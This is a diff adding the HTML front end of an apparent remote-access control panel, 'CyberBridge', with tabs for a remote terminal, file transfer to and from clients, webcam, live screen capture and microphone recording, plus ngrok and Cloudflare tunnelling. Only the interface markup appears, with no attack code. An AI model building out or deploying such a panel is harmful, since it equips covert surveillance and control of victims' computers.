@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>CyberBridge Web • Liquid Glass</title>
+<link rel="stylesheet" href="style.css">
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+</head>
+<body>
+<div class="matrix-bg"></div>
+<div class="app">
+  <header class="banner">
+    <div class="logo">⬡ CYBERBRIDGE</div>
+    <div class="title">REMOTE MONITORING STATION</div>
+    <div class="clock" id="clock">--:--:--</div>
+    <div class="status" id="status">● AWAITING CONNECTIONS</div>
+  </header>
+  <div class="body">
+    <aside class="panel left">
+      <div class="panel-header">
+        <div>◈ CONNECTIONS</div>
+        <div id="conn-count" class="count">0</div>
+      </div>
+      <div class="filter">
+        <label>FILTER:</label>
+        <input id="filter-input" placeholder="hostname / ip">
+      </div>
+      <div id="session-list" class="list"></div>
+      <button id="delete-btn" class="btn danger">🗑 ELIMINAR CONEXIÓN</button>
+      <div id="left-status" class="left-status">● Listening…</div>
+    </aside>
+    <main class="panel right">
+      <div class="session-bar">
+        <div id="session-label">[ No session selected — click a client ]</div>
+        <button id="connect-btn" class="btn">⚡ CONNECT</button>
+        <button id="disconnect-btn" class="btn danger">✕ DISCONNECT</button>
+      </div>
+      <div class="tabs">
+        <button class="tab active" data-tab="terminal">▶ TERMINAL</button>
+        <button class="tab" data-tab="sysinfo">◆ SYSINFO</button>
+        <button class="tab" data-tab="files">📂 FILES</button>
+        <button class="tab" data-tab="camera">◉ CAMERA</button>
+        <button class="tab" data-tab="screenshot">⎙ SCREENSHOT</button>
+        <button class="tab" data-tab="audio">🎙 AUDIO</button>
+        <button class="tab" data-tab="matrix">◈ MATRIX</button>
+      </div>
+      <div class="tab-content">
+        <section id="terminal" class="tab-pane active">
+          <div class="pane-header">▶ REMOTE TERMINAL</div>
+          <div class="term-output" id="term-output"></div>
+          <div class="term-input">
+            <span class="prompt" id="term-prompt">C:\\></span>
+            <input id="term-cmd" placeholder="comando..." />
+            <button id="term-send" class="btn sm">► EXEC</button>
+            <button id="term-clear" class="btn sm">CLEAR</button>
+          </div>
+        </section>
+        <section id="sysinfo" class="tab-pane">
+          <div class="pane-header">◆ SYSINFO</div>
+          <pre id="sysinfo-output">Selecciona un cliente</pre>
+        </section>
+        <section id="files" class="tab-pane">
+          <div class="pane-header">📂 FILE TRANSFER</div>
+          <div class="file-transfer">
+            <div class="ft-section">
+              <div class="ft-title">UPLOAD (Server → Client)</div>
+              <div class="ft-row">
+                <label>Local File:</label>
+                <input type="file" id="up-file">
+              </div>
+              <div class="ft-row">
+                <label>Remote Path:</label>
+                <input id="up-remote" placeholder="C:\Windows\Temp\" value="C:\Windows\Temp\">
+              </div>
+              <div class="ft-row">
+                <button id="up-send" class="btn">⬆ UPLOAD TO CLIENT</button>
+              </div>
+            </div>
+            <div class="ft-section">
+              <div class="ft-title">DOWNLOAD (Client → Server)</div>
+              <div class="ft-row">
+                <label>Remote File:</label>
+                <input id="down-remote" placeholder="C:\path\to\file">
+              </div>
+              <div class="ft-row">
+                <label>Local Dest:</label>
+                <input id="down-local" placeholder="Descargas" value="Downloads">
+              </div>
+              <div class="ft-row">
+                <button id="down-send" class="btn">⬇ DOWNLOAD FROM CLIENT</button>
+              </div>
+            </div>
+          </div>
+          <div class="log" id="file-log"></div>
+        </section>
+        <section id="camera" class="tab-pane">
+          <div class="pane-header">◉ CAMERA FEED <span id="cam-status" class="status-tag">IDLE</span></div>
+          <div class="media-wrap">
+            <img id="cam-img" alt="camera">
+            <div id="cam-placeholder" class="placeholder">[ NO FEED ]<br>Select a client to view camera</div>
+          </div>
+          <div class="media-controls">
+            <button id="cam-start" class="btn">▶ START</button>
+            <button id="cam-stop" class="btn danger">■ STOP</button>
+          </div>
+        </section>
+        <section id="screenshot" class="tab-pane">
+          <div class="pane-header">🖥 SCREEN <span id="scr-status" class="status-tag">IDLE</span> <span id="scr-fps"></span></div>
+          <div class="scr-controls">
+            <label>QUALITY <input id="scr-quality" type="range" min="20" max="85" value="45"></label>
+            <span id="scr-quality-val">45</span>
+            <label>SCALE <input id="scr-scale" type="range" min="30" max="100" value="65"></label>
+            <span id="scr-scale-val">0.65</span>
+            <span id="scr-res"></span>
+            <span id="scr-ts"></span>
+          </div>
+          <div class="media-wrap">
+            <img id="scr-img" alt="screen">
+            <div id="scr-placeholder" class="placeholder">[ No Signal ]<br>Click CAPTURE or LIVE to start</div>
+          </div>
+          <div class="media-controls">
+            <button id="scr-capture" class="btn">📷 CAPTURE</button>
+            <button id="scr-live" class="btn">▶ LIVE</button>
+            <button id="scr-save" class="btn">💾 GUARDAR CAPTURA</button>
+            <label class="check"><input type="checkbox" id="scr-auto"> AUTO-SNAP (10s)</label>
+          </div>
+        </section>
+        <section id="audio" class="tab-pane">
+          <div class="pane-header">🎙 MICROPHONE <span id="aud-status" class="status-tag">IDLE</span></div>
+          <div class="audio-level">
+            <label>LEVEL</label>
+            <canvas id="aud-level" height="20"></canvas>
+          </div>
+          <div id="aud-log" class="log"></div>
+          <div class="media-controls">
+            <button id="aud-listen" class="btn">▶ LISTEN</button>
+            <button id="aud-stop" class="btn danger">■ STOP</button>
+            <button id="aud-record" class="btn">⏺ RECORD</button>
+          </div>
+        </section>
+        <section id="matrix" class="tab-pane">
+          <canvas id="matrix-canvas"></canvas>
+        </section>
+      </div>
+    </main>
+  </div>
+  <footer class="statusbar">
+    <span id="bottom-left">CyberBridge Server | HTTP | ngrok compatible</span>
+    <div class="footer-actions">
+      <button id="btn-protocol" class="btn sm">⚙ PROTOCOLOS</button>
+      <button id="btn-tunnel" class="btn sm">⚙ TÚNELES</button>
+      <span>Clients: <b id="footer-count">0</b></span>
+    </div>
+  </footer>
+</div>
+
+<!-- Modal Protocolos -->
+<div id="modal-protocol" class="modal hidden">
+  <div class="modal-box">
+    <h3>Select Protocol</h3>
+    <p>Choose the protocol for incoming connections:</p>
+    <div class="radio-group" id="proto-options">
+      <label><input type="radio" name="proto" value="HTTP" checked> HTTP</label>
+      <label><input type="radio" name="proto" value="UDP"> UDP</label>
+      <label><input type="radio" name="proto" value="TCP"> TCP</label>
+      <label><input type="radio" name="proto" value="RCP"> RCP</label>
+    </div>
+    <div class="modal-actions">
+      <button id="proto-apply" class="btn">APPLY PROTOCOL</button>
+      <button id="proto-cancel" class="btn danger">CANCEL</button>
+    </div>
+  </div>
+</div>
+
+<!-- Modal Tuneles -->
+<div id="modal-tunnel" class="modal hidden">
+  <div class="modal-box">
+    <h3>Proxy & Tunnel Configuration</h3>
+    <p>Expose your local server to the internet securely:</p>
+    <div class="radio-group" id="tunnel-options">
+      <label><input type="radio" name="tunnel" value="Cloudflare Tunnels" checked> Cloudflare Tunnels</label>
+      <label><input type="radio" name="tunnel" value="Ngrok"> Ngrok</label>
+      <label><input type="radio" name="tunnel" value="Local (Ninguno)"> Local (Ninguno)</label>
+    </div>
+    <div class="modal-actions">
+      <button id="tunnel-apply" class="btn">START TUNNEL</button>
+      <button id="tunnel-cancel" class="btn danger">CANCEL</button>
+    </div>
+  </div>
+</div>
+
+<script src="app.js"></script>
+</body>
+</html>
